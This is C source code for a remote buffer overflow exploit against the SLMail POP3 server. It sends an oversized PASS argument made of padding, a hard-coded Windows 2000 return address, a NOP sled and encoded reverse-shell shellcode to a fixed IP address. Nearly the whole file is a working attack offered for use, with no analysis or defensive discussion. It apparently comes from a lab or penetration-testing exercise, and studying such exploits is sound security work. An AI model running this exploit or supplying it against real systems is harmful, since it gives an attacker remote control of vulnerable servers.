#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h> 
#define retadd "\xE3\x41\x4B\x5F" /*win2k server sp4 0x773a459f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xd9\xc0\xbf\xf4\x07\xb9\x94\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x7b\x17\x83\xc3\x04\x03\x8f\x14\x5b\x61\x93\xf3\x19"
"\x8a\x6b\x04\x7e\x02\x8e\x35\xbe\x70\xdb\x66\x0e\xf2\x89\x8a"
"\xe5\x56\x39\x18\x8b\x7e\x4e\xa9\x26\x59\x61\x2a\x1a\x99\xe0"
"\xa8\x61\xce\xc2\x91\xa9\x03\x03\xd5\xd4\xee\x51\x8e\x93\x5d"
"\x45\xbb\xee\x5d\xee\xf7\xff\xe5\x13\x4f\x01\xc7\x82\xdb\x58"
"\xc7\x25\x0f\xd1\x4e\x3d\x4c\xdc\x19\xb6\xa6\xaa\x9b\x1e\xf7"
"\x53\x37\x5f\x37\xa6\x49\x98\xf0\x59\x3c\xd0\x02\xe7\x47\x27"
"\x78\x33\xcd\xb3\xda\xb0\x75\x1f\xda\x15\xe3\xd4\xd0\xd2\x67"
"\xb2\xf4\xe5\xa4\xc9\x01\x6d\x4b\x1d\x80\x35\x68\xb9\xc8\xee"
"\x11\x98\xb4\x41\x2d\xfa\x16\x3d\x8b\x71\xba\x2a\xa6\xd8\xd3"
"\x9f\x8b\xe2\x23\x88\x9c\x91\x11\x17\x37\x3d\x1a\xd0\x91\xba"
"\x5d\xcb\x66\x54\xa0\xf4\x96\x7d\x67\xa0\xc6\x15\x4e\xc9\x8c"
"\xe5\x6f\x1c\x02\xb5\xdf\xcf\xe3\x65\xa0\xbf\x8b\x6f\x2f\x9f"
"\xac\x90\xe5\x88\x47\x6b\x6e\xbd\x9c\x73\x9c\xa9\xa0\x73\x61"
"\x91\x2c\x95\x0b\xf5\x78\x0e\xa4\x6c\x21\xc4\x55\x70\xff\xa1"
"\x56\xfa\x0c\x56\x18\x0b\x78\x44\xcd\xfb\x37\x36\x58\x03\xe2"
"\x5e\x06\x96\x69\x9e\x41\x8b\x25\xc9\x06\x7d\x3c\x9f\xba\x24"
"\x96\xbd\x46\xb0\xd1\x05\x9d\x01\xdf\x84\x50\x3d\xfb\x96\xac"
"\xbe\x47\xc2\x60\xe9\x11\xbc\xc6\x43\xd0\x16\x91\x38\xba\xfe"
"\x64\x73\x7d\x78\x69\x5e\x0b\x64\xd8\x37\x4a\x9b\xd5\xdf\x5a"
"\xe4\x0b\x40\xa4\x3f\x88\x70\xef\x1d\xb9\x18\xb6\xf4\xfb\x44"
"\x49\x23\x3f\x71\xca\xc1\xc0\x86\xd2\xa0\xc5\xc3\x54\x59\xb4"
"\x5c\x31\x5d\x6b\x5c\x10";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(3000);
    memset(buffer, 0x00, 3000);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
    memset(nop, 0x00, 17);
    memset(nop, 0x90, 16);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.10.110");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
